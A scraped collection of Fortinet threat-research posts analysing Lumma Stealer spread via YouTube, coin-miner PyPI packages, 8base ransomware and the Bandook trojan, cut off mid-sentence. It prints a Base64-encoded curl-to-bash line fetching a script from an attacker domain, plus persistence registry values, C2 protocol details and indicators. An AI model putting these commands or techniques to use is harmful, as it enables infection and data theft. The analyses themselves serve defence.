    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The information collected can be used for future attacksSeverity Level:High FortiGuard Labs recently discovered a threat group using YouTube channels to distribute a Lumma Stealer variant. We found and reported on a similar attack method via YouTube inMarch 2023. These YouTube videos typically feature content related to cracked applications, presenting users with similar installation guides and incorporating malicious URLs often shortened using services like TinyURL and Cuttly. To circumvent straightforward web filter blacklists, the attackers exploit open-source platforms like GitHub and MediaFire instead of deploying their malicious servers. In this case, the shared links lead to the direct download of a new private .NET loader responsible for fetching the final malware, Lumma Stealer. Lumma Stealer targets sensitive information, including user credentials, system details, browser data, and extensions. It has been advertised on the dark web and a Telegram channel since 2022, with over a dozen observed command-and-control (C2) servers in the wild and multiple updates. Figure 1 shows Lumma Stealer's C2 server telemetry, illustrating a global presence with a peak observed in December. In this article, we will elaborate on each stage's behaviors that facilitated the stealer's distribution. The hacker initially breaches a YouTuber's account and uploads videos masquerading as sharing cracked software. Figure 3 shows the video descriptions in which a malicious URL is embedded, enticing users to download a ZIP file that harbors malicious content for the next stage of the attack. The videos were uploaded earlier this year, but the files on the file-sharing site receive regular updates (Figure 4), and the number of downloads keeps growing. This indicates that the ZIP file is always new and that this method effectively spreads malware. The ZIP file, “installer_Full_Version_V.1f2.zip,” contains an LNK file that calls PowerShell to download a .NET execution file via the GitHub repository “New” owned by John1323456 (Figure 6). The abbreviated URL, “hxxp://cutt[.]ly/lwD7B7lp,” connects to “hxxps://github[.]com/John1323456/New/raw/main/Installer-Install-2023_v0y.6.6[.]exe.” The other two repositories, “LNK” and “LNK-Ex,” also include NET loaders and spread InfoStealer as the final payload. The private .NET loader is obfuscated with SmartAssembly. It first gets the system’s environment value, shown in Figure 7. Once the number of the data is correct, it proceeds to load the PowerShell script. Otherwise, it exits the program. Figure 8 shows the construction of a dictionary that defines the following properties of the ProcessStartInfo object that the malicious code uses to execute discreetly and avoid raising suspicion from its victims: Next, the ProcessStartInfo object is employed to launch the PowerShell process, wherein the PowerShell script is directed to the process's standard input. Figure 9 illustrates a portion of the code and the newly generated process. Figure 10 shows the partial PowerShell code from the private .NET loader. The script encodes the server IP address in Base64 and encompasses four servers. It assesses the system date, choosing the appropriate IP to retrieve encrypted binary data. To obfuscate analysis, the script incorporates a substantial amount of extraneous code. Figure 11 shows captured traffic downloaded from the first server, 176[.]113[.]115[.]224:29983. After receiving the data, the script decrypts it using AES CBC, followed by GZip decompression to obtain the DLL file for the next stage. It then invokes the DLL file with a specific method and type via “[System.Reflection.Assembly]::Load(),” as shown in Figure 12. Figure 13 shows the targeted function “PerkyRiggal,” which is pivotal in inspecting the system and environment. It employs several PNG files in the Resources section to decipher the ultimate payload of Lumma Stealer. To avoid detection, the file encodes all its strings using the \"BygoLarchen\" method. Figure 14 demonstrates the function of decoding the target text with a predefined key string. It checks the following items to achieve Anti-VM and Anti-Debug: After completing all environment checks, the program decrypts the resource data and invokes the \"SuspendThread\" function. This function is employed to transition the thread into a \"suspended\" state, a crucial step in the process of payload injection (see Figure 15). Lumma stealer is a type of malware that can steal sensitive information from a user’s computer. It can target the system data, the browsers, crypto wallets, and browser extensions. It is written in C language and sold on underground forums. To elude detection and analysis, it employs diverse obfuscation techniques. The malware establishes communication with a command and control server, facilitating the exchange of instructions and transmitting pilfered data. Figure 16 shows the method to contact a command and control (C2) server. Once it gets the first server that can set up a connection, it then sends out a POST message with hardcoded User-Agent “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36“ and parameter “act=life” to check-in. The corresponding code is shown in Figure 17. Next, it sends a POST request with the Lumma ID and “act=receive-message,” shown in Figure 18. Then, the compressed stolen data is uploaded to the C2 server with URI “/api.” Although the version is still “4.0,” Lumma Stealer has recently updated its exfiltration to leverage HTTPS to better evade detection. In this attack, the malicious actor targets YouTube channels to disseminate Lumma Stealer. The crafted installation ZIP file serves as an effective bait to deliver the payload, exploiting the user's intention to install the application and prompting them to click the installation file without hesitation. URLs from open-source websites throughout the scheme aim to diminish user awareness. The attackers further deploy a private .NET loader with environment checks, various anti-virtual machine (Anti-VM), and anti-debugging functions. Users must exercise caution regarding unclear application sources and ensure legitimate applications from reputable and secure origins are used. The malware described in this report are detected and blocked byFortiGuard Antivirusas: W32/Stealer.QLD!trMSIL/Agent.WML!trMSIL/Kryptik.BJF!trLNK/Agent.WML!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The URLs are rated as “Malicious Websites” by theFortiGuard Web Filteringservice. We also suggest that organizations go through the freeFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 176[.]113[.]115[.]224176[.]113[.]115[.]226176[.]113[.]115[.]227176[.]113[.]115[.]229176[.]113[.]115[.]232 Netovrema[.]pwopposesicknessopw[.]pwpolitefrightenpowoa[.]pwchincenterblandwka[.]pw 48cbeb1b1ca0a7b3a9f6ac56273fbaf85e78c534e26fb2bca1152ecd7542af54483672a00ea676236ea423c91d576542dc572be864a4162df031faf35897a53201a23f8f59455eb97f55086c21be934e6e5db07e64acb6e63c8d358b763dab4f7603c6dd9edca615d6dc3599970c203555b57e2cab208d87545188b57aa2c6b1 cracked,youtube,Cara Lin FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/lumma-variant-on-youtube"
  },
  {
    "title": "Three New Malicious PyPI Packages Deploy CoinMiner on Linux Devices",
    "content": "FortiGuard Labs Threat Research Affected platforms:LinuxAffected parties:Linux users that have these malicious packages installedImpact:Latency in device performanceSeverity level:High On December 5th, 2023, FortiGuard's AI-driven OSS malware detection system identified three intriguing PyPI (Python Package Index) packages. These packages, upon initial use, deploy a CoinMiner executable on Linux devices. Leveraging our historical malware database, we noted that the indicators of compromise (IoCs) for these packages bear a resemblance to the \"culturestreak\" PyPI package discovered earlier this September. A comprehensive overview of the attack pattern of \"culturestreak\" was previously detailed in a Checkmarxblog post. In this analysis, we cover the attack phases of these three new packages, focusing on their similarities and developments compared to \"culturestreak.\" These three harmful packages are named modularseven-1.0, driftme-1.0, and catme-1.0. They all originate from the same author, known as \"sastra\", who created a PyPI account shortly before uploading the first of these malicious packages. These packages all exhibit a common attack methodology, so we will use driftme-1.0 as an example to illustrate the stages of the attack. Echoing the approach of the earlier \"culturestreak\" package, these packages conceal their payload, effectively reducing the detectability of their malicious code by hosting it on a remote URL. The payload is then incrementally released in various stages to execute its malicious activities. The malicious activity is triggered by the “import” statement in the __init__.py file: The processor.py module contains thefirst stageof the malicious payload: By calling the processing() function, it decodes the string Y3VybCBodHRwczovL3BhcGljdWxvLm5ldC91bm1pLnNoIHwgYmFzaA== into a shell command that fetches the content from the specified URL using curl. It then pipes that content directly to the Bash shell, which executes the following script: Looking into the “unmi.sh” script, we found that it contains thesecond stageof the malicious payload: Utilizing the “unmi.sh” script, the attacker downloads two critical items onto the user’s device: The first is “config.json,” a configuration file required for executing the program that will be installed. This file outlines the cryptocurrency mining setting. Specifically, it determines the mining algorithm, i.e., randomX, the device resource settings for mining operations, and the designated mining \"pools,\" along with the beneficiary’s wallet account. Notably, the attacker has chosen to disable the \"init-avx2\" feature, presumably to ensure compatibility with older devices. The second key component of the payload is the CoinMiner executable: Similar to the configuration file, this executable is also hosted at a remote address: hxxps://gitlab.com/ajo9082734/Mine/-/raw/main/X Once the executable is downloaded from the remote URL and marked as executable, the attacker employs the “nohup” command to execute it in the background. This ensures the process remains active beyond the terminal session. The most deceptive aspect is that the attacker ensures that all these modifications are appended to the ~/.bashrc file, ensuring the reactivation of this malicious activity whenever the user initiates a new Bash shell session. The coinMiner ELF file, retrieved during this process, is not new to the security community. It was initially uploaded to VirusTotal (VT) in 2021. Currently, a significant number of vendors on VT recognize the payload as malicious. The three packages discussed in this blog have IoCs similar to “culturestreak”: These three packages, when compared to \"culturestreak,\" showcase enhanced strategies in both concealing their presence and maintaining their malicious functions. A key enhancement is the introduction of an extra stage, where crucial commands for the malicious operations are stored in the “unmi.sh” file on a remote server. This tactic improves the odds of evading detection by security solutions by minimizing the code within the PyPI package. It also allows for more controlled disclosure of the malicious code by simply disabling the server hosting this “unmi.sh” script. Moreover, this malware inserts the malicious commands into the ~/.bashrc file. This addition ensures the malware's persistence and reactivation on the user's device, effectively extending the duration of its covert operation. This strategy aids in the prolonged, stealthy exploitation of the user's device for the attacker's benefit. A notable trend we observed from this particular set of packages is that malicious actors continuously refine their strategies to conceal and lengthen the exploitation process. An essential tactic discussed in this blog involves breaking down the entire malicious workflow into smaller stages and releasing them incrementally. For the security community, the ability to detect subtle malicious indicators becomes crucial. Furthermore, this serves as a reminder of the critical importance of thoroughly scrutinizing code and packages sourced from unverified or suspicious origins and staying well-informed about potential threats. FortiGuard AntiVirus detects the malicious files identified in this report as unmi.sh:Linux/Agent.4EFF!trmodularseven-1.0/modularseven/processor.py:Python/Agent.5337!trdriftme-1.0/driftme/processor.py:Python/Agent.5337!trcatme-1.0/catme/processor.py:Python/Agent.5337!trtmp/X:Riskware/CoinMiner The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report, which may operate as dependencies in users' projects in test phases and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. unmi.sh 070128a5b4e1aecb61b59f3f8ef2602e63cd1e5357f1314080a7c8a4960b0bee modularseven-1.0/modularseven/processor.py 4b439d8cabc5e4ad593a26065e6d374efdddf41c8d91744b077a69812df170d2 driftme-1.0/driftme/processor.py 687fb012479e563be63e02718eb7be7ee81974193c952777ca94234c95b25115 catme-1.0/catme/processor.py 235b1ad3d21e7330d421c9a03b6b822fcdddacaa707bed9d67dabd43d4401fc6 tmp/X df0211bf54174b5766366eecfb0a04c4a59346478e1507b6685fbaed6b2d2aca XLM:GA2DR34VWSXPIE2JFDUZFEIROMXRFYUYNB2XD5JWKPD2TWELUJQZ4WCW.WORKER hxxps[:]//papiculo[.]net/unmi[.]shhxxps[:]//papiculo[.]net/unmiconfig[.]jsonhxxps[:]//gitlab[.]com/ajo9082734/Mine/-/raw/main/X malicious FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/malicious-pypi-packages-deploy-coinminer-on-linux-devices"
  },
  {
    "title": "Ransomware Roundup - 8base",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the 8base ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryptionSeverity level:High 8base is a financially motivated ransomware variant most likely based on the Phobos ransomware. Per our FortiRecon information, the 8base ransomware first appeared in May 2023. FortiGuard Labs has observed SmokeLoader variants delivering the 8base ransomware. Such SmokeLoader samples include bab3c87cac6db1700f0a0babaa31f5cd544961d1b9ec03fd8bcdeff837fc9755 and ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc. The 8base ransomware may also rely on other distribution methods. According to data collected through Fortinet'sFortiRecon service, the 8base ransomware has targeted multiple industry verticals (Figure 2). The ransomware most impacted business services, followed by the manufacturing and construction sectors. When victim organizations are ranked according to country (Figure 3), the United States leads by a wide margin. Once the ransomware is executed, it looks for files to encrypt. It skips files if the filename contains one of the following strings: info.hta (ransom note) info.txt (ransom note) boot.ini bootfont.bin ntldr ntdetect.com io.sys recov It also avoids the following folders: The ransomware avoids encrypting files inside the Caches folder, most likely because doing so may lead to software problems. It also tries to kill the following processes before encrypting files: msftesql.exe sqlagent.exe sqlbrowser.exe sqlservr.exe sqlwriter.exe oracle.exe ocssd.exe dbsnmp.exe synctime.exe agntsvc.exe mydesktopqos.exe isqlplussvc.exe xfssvccon.exe mydesktopservice.exe ocautoupds.exe agntsvc.exe agntsvc.exe agntsvc.exe encsvc.exe firefoxconfig.exe tbirdconfig.exe ocomm.exe mysqld.exe mysqld-nt.exe mysqld-opt.exe dbeng50.exe sqbcoreservice.exe excel.exe infopath.exe msaccess.exe mspub.exe onenote.exe outlook.exe powerpnt.exe steam.exe thebat.exe thebat64.exe thunderbird.exe visio.exe winword.exe wordpad.exe Killing these processes ensures that any files open in them, such as MS Office files, will be closed so the ransomware can encrypt them. The 8base ransomware also checks for file size, with a threshold set at 1.5MB. The ransomware fully encrypts files smaller than 1.5MB. On the other hand, it partially encrypts files larger than 1.5MB, most likely to increase the encryption speed. The encryption speed is often a subject of competition among ransomware developers because they want to encrypt as many files as possible before the victim becomes aware of the infection. To elaborate a bit, the ransomware injects blocks comprised of 0x40000 null bytes into various parts of the final output/encrypted file, starting at the beginning of the file. It also encrypts the last 0xC0000 bytes (with additional encrypted metadata) and may leave other parts of the file unencrypted. The ransomware then uses AES to encrypt any target files discovered and adds a file extension that includes the attacker’s contact email address “.id[unique ID assigned to the victim].[removed@rexsdata.pro].8base”. In the middle of November 2023, we came across a different version of the 8base ransomware (SHA2: 45de59851d68929632346d6f894dc8c1b6a5c4197db83c2e33c60631efc0b39f). This variant is written in C instead of the .NET used in older variants. This recent 8base ransomware variant excludes the same files and folders from file encryption, but after encrypting files, it displays a significantly longer ransom note than the one used in the .NET variants. The ransom note includes a contact email address and a TOR data leak site address not included in previous ransom notes. It also adds a new file extension to the files it encrypts, “.id[unique ID assigned to the victim].[recovery8files@(removed).org].8base”. The 8base ransomware group owns a TOR site where victims can contact the threat actor. The stolen information was released through various file storage/sharing services such as Gofile, Pixeldrain, files.dp.ua, AnonFiles, Anonym File, and Mega. The 8base ransomware TOR site includes a victim list, contact form, FAQ, and terms of service. Fortinet customers are already protected from this malware variant through our AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects the 8base ransomware samples with the following AV signatures: TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. SHA2 30e90f33067608e8e7f4d57fd6903adb5eccb91bf426c56569c16bf86f0d8971 45de59851d68929632346d6f894dc8c1b6a5c4197db83c2e33c60631efc0b39f b3725e7f3a53ea398fd0136e63c9c11d8c1addc778eece2ce1ac2ca2fc9cd238 c83894f6f01a0d4a492c2e05966816e27dac6b9093f83b499b6a5b2f28b53cec 4e4c154f0500990e897ca9650eafd3c6255ba4df3b4bc620c6ba27b718278392 159fa561bf9069418c5b2a33525ee12b16385f96680890a285d401b9f6781643 7e18ff461e3fc159c9b6634c9250600ea4c62da604885697c95d9bac794109b8 482754d66d01aa3579f007c2b3c3d0591865eb60ba60b9c28c66fe6f4ac53c52 49699985414185b85cdf0a0292dfd1fb0e7b0b4925daa165351efed6e348335a 2cfd30a7982b90be60f83fe5f4132999ac50d0d63d9681d8d50c3c8271faa34b 8f60d17bbaefd66fe94d34ea3262a1e94b0f8f0702c437d19d3e292c72f1cedc 274c6ea98df4de5fc99661b0af876c3556c8a9125697efa3cbdc6fa81b80395d 427ac2bb816309c11b12c895787c862017d5725ed7de137b5eb10c03e89c0b8c 518544e56e8ccee401ffa1b0a01a10ce23e49ec21ec441c6c7c3951b01c1b19c 3d805293a70df3a5e1e392ee05ed7b88eda054ee97072eac5590baecfc44cb74 88f6a6455f92255a189526e36aeb581c95c28dc5e26357e7667f871444a336ba fa620f37539b2c7e53d4c06de1b680d0eab5c3a5280b89d1700e014bfd320519 b3e80316dc1e01af60bcea7218ab5ebfe81432643d29ab46b22e3b11658606d5 03666df8dd1cd6f9e05e28a0660223d514351e05a8c61179f59e9e2c5e10d471 4fd3f6a16bccb7c9d4631241b6f8ebe58515fa2c593e4c938939492615869432 8c46f85644793051b8966d2edeeccdb8416aa04289dc0803d8da90fe6c98014c abc4e3744b5a6b6ca367b81dabc9ff13d509d0bb5b4be6daa7d5419c57e5ea4b 2a270618cf65fcfb6476269b7c7bdbae84552d15a3da3e8907425e20ace4548a 01b2ec8085dace807c190f3f26d5e5ce45be0c0ecbd9c944303a36f323272226 d7cb8a2d60e1818d0638a4c38cd6fae475dc83ab7b2bde9827ecc4e4a7ce6ed7 0c0bdd6f7e780b5bde33342e142af12d0d3b2ae40e6d5ab48a4fde3e32751a75 f5d99d4548470b4699b215453e9be29e48aa20616d45f704c335bd3bbe3e0a4f f595f91a9966808cc85d11981e66e98043af9aeaaaa3893ef058b9a79c474f17 aedbddbf7494baaaf759a720d9cd17540d3c171b9cc52a02e0ef9a592bd9cd63 698b2a9cf9ce16f1cb5cff4576e902888cb14db7414b8e6ac4eb728f8c87d209 9f67b6057e5b5dc4b2ec3b370ca3062e0bed91a934b227911af2a3de17164ee5 2673be0eb2cc75805d67cc5876b98cbbe330c73a223be23fb3b41eb447ccd1c9 3a6cfcbf9ef082d94b7a8a0050f42761e115aa3b6ff26edb6c7daf4437fe9917 0867a5d4559cb7084765944e5ab71c67629e90a5fa15e66b7b3d47059c76cb78 33c861023479ddcaea82f2daee9d0394f304d0c33ba210f4c3c53a93cf9a474c 71bd706cc0ace3774449282a9c1de5403f8f43dad118b9fbf4fc45cf4894f8e9 bcdf23bb2e1635cb6639895094f7115af7bc9d07f276507af291cd9b7124e135 a1ee84c3183521e345b17502b38621201ff6edb86db81debec25d58dec5ad96c 667dfdc8b8527599735d93ba94d5e9a30442db7c9e780f103fea07172ee8c740 6e591d4815d6e7ec082696f002c843c6d9155e944a99cdd7dab3db372db6a877 d26de80e8b561adcf33ab3f2fe29f22c6eaddfbe247dcf9028463214e0f87e90 54b3641fc695438be989a08a9dca9f2a5d1ed9d538cb83cb597a17480d580c39 eb24adb38f36113fe71f942596c355afd59a2e83a0663daf32ae9bb30059732c db85c5455b1adee337cf5b6728a9a4776e3645e50d0bf7ff410e34bb710cc42a c68d9dcd8a3038bfe7c6c008149c8792b6033e6249286e4692e16dcb2bd90d41 05c29b528fccf8c2793663a6725c9bf680944ffa6a26129d7aaafd1980bd034c a31a45f1c686c1ae2ff1733e7e7636a17010b85091b17bdf68c27543866dfca5 2288a0c896757647538a7dab5e0c980b70b173ed36c9e6206f6701dfd4112cfb 9215550ce3b164972413a329ab697012e909d543e8ac05d9901095016dd3fc6c 91abe280381d0faf55b521f51d16d8aa022f0cc14b1310334d4fffc3474459d4 d0604a3864899ac9bf0a07e47330b62a3e76b61335d6dac2e9b5a796b9fcc164 d560b84be808a9a324b995a05686237d645248369ce04069350d5b5d979d8365 fd59543a425d2159dfadba8efd4d40178b609ef123a8bc5cf00fe3afef95623d 25d4ec23c3618c7bdbef717c9ded9f7da560b3eb13d8d20f958fe3fbe5a1e37b 97a4d094f86b757b3fb0e189f2843a7af8d0ec43f9805214e89992528e83b5d7 f709d1f84e4f0a845ebb4a9fb1500aa2a9fd600e97cbea32ffc3e49c1084f467 a8d2d0ceaaf6685644b228a767ea6299ea2968f7cae79dd36abf4225b8593fdd 8879a7a950a3916f5438685f994ee829a20e4c60021db73060cd078e4a72b5a7 c0539fd02ca0184925a932a9e926c681dc9c81b5de4624250f2dd885ca5c4763 fa7ed15708d988e7f69b5628db9481816052efea29e93f1bd274a1d76006aee6 790b64a5860a5069fedcb660efdffce2b5ab2195086100a6079697b662f0c198 454f9058a9fd9c266782389850d6142a0d04ce9d8042bc069ccd8d90d60be6d5 32d1458fb5c0c08156568a658f30143786336a73dea1d76bef9becf4a55c0964 3cb4c0f6430f5216818c3438a18c96e7dcf5080129c9eea3f50735811c3e85eb 9d163fbffc9692a3143362c51d35d5ab52d1f209d9d5e053196c79a30e6f7acf 681f180735ec833997bea4eb26c58f9c2e39980cd0a351e0b5cd99c502b33ae8 917f2b461c860f2ee8aed1147094b9273931bb9ee8040d609a485ec150dc3ec0 9f40b69060a52731107baec84a0c0f8a1bfc1a62e8471b9cd69509aade9cb7f1 d4cb20dba15d88c38c35be69fe04538b4f9bb0a12edb51ff23c0171b584edf08 f9805be70bc5c750e01a82742a66e6ffa9ade0ba2f80a97cadbb8fcaeb60dda7 4b891c6c3520d1d81e083f72d7ee9c92870ac6633f1f8419b2f50b4f90681ed6 78732997a6c9d975b97da85fc511533d44083a9f9da60dae8393274a59b7bfce e98c033e303e64af465b7d41d779a3780708c97822a6ebb7cf6ff3db64bc3416 2a50a42d3c44e6e3890a53228cb84f6fdb17e38b31422c68b8634a06d36cc324 104032d8993555a84679746069ad1f8c1365c4a27eaeec732fda76aa62da005a 96a3909ca8917c14a7bd36839dd5abf5c9df9f69b314158e0110365113acf4bb 356799503f195db260e08a81d42a431b4ebd47cef94eddc96f24a0fd3e49d716 15c9373bc7a1cc990d6caa0f3262f6c4adeff93337f642f752b64947ae50cec9 3ec359f6ab125099db4a4f7b6ad6b17ab1411a338be932ea45aea13aad7788c8 45dcbfbb139c81af47b6953482c2d146f5192054c29a2343019e6f1d30912ff4 6cb41c5e8379cc137f64c91f5aaaf88da43b3d13791f12884bedd5a81a83b8d2 505bc570566804139166c0f12ea773d1c459682cc13cfca823b2ddfbd48cd2e2 00e6061a54e469f6c957eda96a0267efded5f8a6a8d4006ea74ded74df5eb703 32b815ce14e6606e53b1ddaf39900c91f126e1d9ce9c5cab2fe825d6b2fa74d9 f909efbae3c83ae64dcd8f57e18be891df6386ca89f3a2f4c40d12ebc1913ef4 872ee36c064f5d9e7df3e5495c7de6aba4b26856556ba2ac124cdbb02693aa02 52661e5c4f8503541a5f361cfa8e4518f852907365e23fdfcc8472fea67df12b 408d62cbf4789d9533230eff49b8b45c11b01fd8c8d6d65ec339725d7521a48c 8113218903975b81b22049796f201e06638595d2f6fadd82da06817bfbce85d7 281481eb8f1579206e55232754f47587a61bbe1460fc1f3b06157f31d214a290 c447b9a04d36e1a1e8560fc380dec019ec3b63506d07d0116e1ec2c28a9b1c30 89c65668def919cdf677df2774c5646540fee498031f7ecd5c7a6be7b62e9953 SHA2 bab3c87cac6db1700f0a0babaa31f5cd544961d1b9ec03fd8bcdeff837fc9755 ea6adefdd2be00d0c7072a9abe188ba9b0c9a75fa57f13a654caeaaf4c3f5fbc Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-8base"
  },
  {
    "title": "Bandook - A Persistent Threat That Keeps Evolving",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Remote attackers gain control of the infected systemsSeverity Level:Critical Bandook malware is a remote access trojan that has been continuously developed since it was first detected in 2007. It has been used in various campaigns by different threat actors over the years. FortiGuard Labs identified a new Bandook variant being distributed via a PDF file this past October. This PDF file contains a shortened URL that downloads a password-protected .7z file. After the victim extracts the malware with the password in the PDF file, the malware injects its payload into msinfo32.exe. In this article, we will briefly introduce Bandook’s behavior, provide detailed information about the modified elements of this new variant, and share some examples of the mechanism of its C2 communication. The injector component decrypts the payload in the resource table and injects it into msinfo32.exe. Before the injection, a registry key is created to control the behavior of the payload. The key name is the PID of msinfo32.exe, and the value contains the control code for the payload. Once executed with any argument, Bandook creates a registry key containing another control code that enables its payload to establish persistence, and it then injects the payload into a new process of msinfo32.exe. There are two registry keys, shown in Figure 1. A variant reported in 2021 required four control codes and created four processes of explorer.exe that it injected in a single execution. This new variant uses less control code and makes a more precise division of tasks. Figure 2 is the overview of the payload. Once injected, the payload initializes strings for the key names of registries, flags, APIs, etc. After this, it uses the PID of the injected msinfo32.exe to find the registry key and then decodes and parses the key value to perform the task specified by the control code. Figure 3 shows the relationship between the key value and the payload’s behavior. The control codes play the same role as previous variants, but strings are used instead of numbers. The variant we found in October 2023 has two additional control codes, but its injector doesn’t create registries for them. One asks the payload to load fcd.dll, which is downloaded by another injected process and calls fcd.dll’s Init function. The other mechanism establishes persistence and executes Bandook’s copy. These unused control codes have been removed from even newer variants (430b9e91a0936978757eb8c493d06cbd2869f4e332ae00be0b759f2f229ca8ce). Of the two remaining control codes, “ACG” is the main control code for an attack, while “GUM” establishes the persistence mechanism. When the control code is “GUM,” Bandook drops a copy to the SMC folder in the appdata folder as “SMC.exe” or “SMC.cpl” and creates a registry key to automatically execute the copy. There are three registry keys to run SMC.exe. Software\\Microsoft\\Windows\\CurrentVersion\\RunKey name: SMCValue: %APPDATA%\\SMC\\SMC.exe Software\\Microsoft\\Windows NT\\CurrentVersion\\WinlogonKey name: shellValue: explorer.exe, %APPDATA%\\SMC\\SMC.exe Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Key name: LoadValue: short path of %APPDATA%\\SMC\\SMC.exe When the copy is SMC.cpl, the registry key and value are the following: Software\\Microsoft\\Windows\\CurrentVersion\\RunKey name: SMCValue: %windir%\\System32\\controll.exe %APPDATA%\\SMC\\SMC.cpl When the control code is ACG, the payload can download files for other modules, including fcd.dll, pcd.dll, an executable file, and others. This is an optional function based on flags set when the payload initializes. The files can also be downloaded from the C2 server when necessary. If fcd.dll is downloaded, Bandook calls its functions and passes the key names of the registry key as arguments. Similarly, many registry keys store information used in other actions. An action may separated into several parts, and it’s necessary to piece all related commands and registry keys together. For example, C2 communication may use one command to write a registry key and a separate command to read it. First, Bandook sends victim information to its C2 server: If the C2 server is available, Bandook receives commands from the server, including *DJDSR^, @0001, @0002, and so on. While the string sequence in the newest variants reaches @0155, some are only used when sending a result to the server, and others only exist in other modules. As shown in Figure 5, the payload doesn’t use the command @0133, though it can be found in fcd.dll. Despite the numbering, the payload only supports 139 actions. In addition, some special commands are only sent to the server under specific conditions. Since most actions are the same as in previous variants, we will focus on communications between Bandook and the C2 server using the new commands added to the most recent variants. These actions can be roughly categorized as file manipulation, registry manipulation, download, information stealing, file execution, invocation of functions in dlls from the C2, controlling the victim’s computer, process killing, and uninstalling the malware. The data from the C2 server has the following format: {Command}~!{Arg2}~!{Arg3}~!{Arg4}~!{Arg5}~!{Arg6}~! The first argument is the command, which is necessary. Arg2 to Arg6 are optional. Below are four examples of actions that require multiple commands and actions that have complex mechanisms. @0003, @0004 This action is about file reading. If Arg3 is R, it keeps calling the Sleep function until the C2 server sends @0004 and its related arguments to Bandook. The @0004 command gives a value to determine from where to read the file or to just do nothing. Finally, Bandook sends the file specified by Arg2 to the C2 server. @0006, @0007 This action is about file writing. Similar to @0003, @0006 waits for @0007. @0007 determines how to write data from the C2 server to a local file. @0126, @0127, @0128 This action executes a Python file. The main command is @0128, which calls a ShellExecute function to run a Python file {Parent 